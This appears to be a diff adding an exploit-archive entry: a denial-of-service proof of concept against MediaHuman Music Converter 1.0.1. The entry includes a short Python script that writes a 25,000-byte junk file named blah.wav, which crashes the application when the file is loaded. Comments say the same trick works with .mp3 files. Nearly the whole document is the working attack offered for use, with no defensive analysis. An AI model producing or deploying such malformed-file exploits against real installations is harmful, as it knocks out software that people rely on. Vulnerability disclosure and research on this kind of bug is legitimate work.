@@ -1,0 +1,21 @@
+# Exploit Title: MediaHuman Music Converter 1.0.1 .wav and .mp3 Denial of Service
+# Date: September 17, 2010
+# Author: modpr0be
+# Software Link: http://www.mediahuman.com/download.html
+# Version: 1.0.1
+# Tested on: Windows 7
+# CVE :
+
+# How it works?
+# Go to Add Files... --> Choose blah .wav and bang! app crash..
+# Testing on Windows 7 Ultimate..crashed, windows auto report and solution
+window pop out..
+# works on .wav and .mp3
+
+#!/usr/bin/python
+
+junk = "\x41" * 25000
+
+file = open('blah.wav','w')
+file.write(junk)
+file.close()
